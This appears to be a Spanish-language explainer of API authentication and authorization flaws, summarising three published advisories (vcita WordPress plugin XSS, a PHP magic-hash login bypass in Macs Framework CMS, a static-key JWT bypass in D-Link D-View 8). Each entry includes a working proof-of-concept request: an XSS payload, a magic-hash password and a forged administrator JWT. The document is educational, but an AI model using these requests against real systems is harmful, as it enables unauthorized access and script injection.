# Errores comunes de autenticación y autorización de API

### 1. **Errores de Autenticación: XSS no Autenticado en Plugins de WordPress por vcita**
   - **Descripción e Impacto**: En los plugins de WordPress de vcita, se descubrieron vulnerabilidades graves. Una de ellas es una vulnerabilidad de Cross-Site Scripting (XSS) no autenticada causada por la falta de validación y saneamiento en un endpoint REST. Un atacante podría enviar una solicitud maliciosa para modificar variables en la base de datos, ejecutando así scripts maliciosos en el sitio web afectado.

   - **Ejemplo de Código**:
     ```bash
     curl –request POST \
     –url https://example.com/wp-json/vcita-wordpress/v1/actions/auth \
     –header 'Content-Type: application/json' \
     –data '{ "success": true, "user_data": { "business_id": "\” alert(1); //", "business_name": "Evil Eve", "email": " [email protected] ” } }'
     ```

   - **Fuente**: [Jonas' Blog](https://blog.jonh.eu/blog/security-vulnerabilities-in-wordpress-plugins-by-vcita)

### 2. **Errores de Autorización: Confusión de Tipo en PHP en Macs Framework v1.1.4f CMS**
   - **Descripción e Impacto**: La vulnerabilidad en el Macs Framework v1.1.4f CMS es causada por una comparación débil en la función `isValidLogin()`, que lleva a una confusión de tipo en PHP. Esto permite eludir la autenticación utilizando cualquier contraseña que resulte en un "hash mágico", permitiendo el acceso no autorizado a cuentas administrativas.
   
   - **Ejemplo de Código**:
     ```http
     POST /index.php/main/cms/login HTTP/1.1
     Host: 172.17.0.2
     Content-Length: 62
     Accept: */*
     X-Requested-With: XMLHttpRequest
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
     Content-Type: application/x-www-form-urlencoded
     Origin: http://172.17.0.2
     Referer: http://172.17.0.2/index.php/main/cms/login
     Accept-Encoding: gzip, deflate
     Accept-Language: en-US,en;q=0.9
     Cookie: PHPSESSID=di4ceqcv9432vcb0p27rkh7k82
     Connection: close
     ajaxRequest=true&&username=testadmin&password=0gdVIdSQL8Cm&scrollPosition=0
     ```

   - **Fuente**: [CXSecurity](https://cxsecurity.com/issue/WLB-2023090075)

### 3. **Gestión Incorrecta de Tokens: Bypass de Autenticación en D-Link D-View 8**
   - **Descripción e Impacto**: En D-Link D-View 8, se encontró una vulnerabilidad de bypass de autenticación relacionada con el uso de una clave estática para los tokens JWT. Un atacante podía crear un JWT válido y usarlo para acceder a APIs protegidas, especialmente debido a que no se verificaba la clave API para el usuario administrador predeterminado.

   - **Ejemplo de Código**:
     ```bash
     curl -k -H 'Authorization: eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiand0In0.eyJvcmdJZCI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODA5YWEiLCJ1c2VySWQiOiAiNTkxNzFkNTYtZTZiNC00Nzg5LTkwZmYtYTdhMjdmZDQ4NTQ4IiwidHlwZSI6IDMsImtleSI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODkwYmIiLCJpYXQiOiAxNjg2NzY1MTk4LCJqdGkiOiAiZmRhOGU1YzNlNWY1MTQ5MDMzZThiM2FkNWI3ZDhjMjUiLCJuYmYiOiAxNjg2NzYxNTk4LCJleHAiOiAxODQ0NDQ1MTk4fQ.5swhQdiev4r8ZDNkJAFVkGfRTIaUQlwVue2AI18CrcI' 'https://<dview8-host>:17300/dview8/api/usersByLevel'
     ```
     
   - **Fuente**: [Tenable Research Advisory](https://www.tenable.com/security/research/tra-2023-32)
